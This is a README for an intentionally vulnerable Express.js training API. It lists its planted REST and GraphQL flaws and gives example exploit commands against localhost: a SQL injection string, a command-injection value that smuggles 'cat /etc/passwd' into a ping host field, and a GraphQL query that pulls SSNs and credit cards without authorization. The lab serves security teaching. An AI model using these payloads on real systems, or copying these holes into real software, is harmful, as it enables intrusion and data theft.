# API Security Dojo - Express.js Implementation

Intentionally vulnerable API for learning API security.

## Warning

This software contains **intentional** vulnerabilities for educational purposes.
**Never deploy in production.**

## Quick Start

```bash
# Install dependencies
npm install

# Start the API
npm start

# Or in development mode (with watch)
npm run dev
```

The API will be available at `http://localhost:3001`

## Endpoints

| Endpoint | Description |
|----------|-------------|
| `/` | API information |
| `/health` | Health check |
| `/api/*` | REST API endpoints |
| `/api/v1/*` | Legacy API (V09) |
| `/graphql/` | GraphQL endpoint + GraphiQL UI |

## Vulnerabilities

### REST API (V01-V10)

| ID | Vulnerability | Endpoint |
|----|---------------|----------|
| V01 | Broken Object Level Authorization (BOLA) | `GET /api/users/:id` |
| V02 | Broken Authentication (JWT) | `POST /api/login` |
| V03 | Excessive Data Exposure | `GET /api/users`, `GET /api/products` |
| V04 | Lack of Rate Limiting | `POST /api/login` |
| V05 | Mass Assignment | `PUT /api/users/:id` |
| V06 | SQL Injection | `GET /api/products?search=` |
| V07 | Command Injection | `POST /api/tools/ping` |
| V08 | Security Misconfiguration | Headers, CORS, `/api/tools/debug` |
| V09 | Improper Assets Management | `/api/v1/*` |
| V10 | Insufficient Logging | All endpoints |

### GraphQL (G01-G05)

| ID | Vulnerability | Description |
|----|---------------|-------------|
| G01 | Introspection Exposed | Schema accessible via `__schema` |
| G02 | Nested Queries (DoS) | Unlimited query depth |
| G03 | Batching Attacks | Array of operations accepted |
| G04 | Field Suggestions | Error messages reveal field names |
| G05 | Authorization Bypass | Sensitive data without auth |

## API Modes

Switch modes with the environment variable:

```bash
# Challenge mode (default)
DOJO_MODE=challenge npm start

# Documentation mode
DOJO_MODE=documentation npm start
```

## Example Exploits

### V06 - SQL Injection

```bash
curl "http://localhost:3001/api/products?search=' OR '1'='1"
```

### V07 - Command Injection

```bash
curl -X POST http://localhost:3001/api/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"host": "127.0.0.1; cat /etc/passwd"}'
```

### V09 - Legacy API

```bash
curl http://localhost:3001/api/v1/users
# Returns all users with password hashes!
```

### G05 - GraphQL Authorization Bypass

```bash
curl -X POST http://localhost:3001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { username ssn creditCard apiKey } }"}'
```

## Tech Stack

- Express.js 5.x
- better-sqlite3 (SQLite)
- jsonwebtoken (JWT)
- bcryptjs (Password hashing)
- express-graphql + graphql

## License

Educational use only.
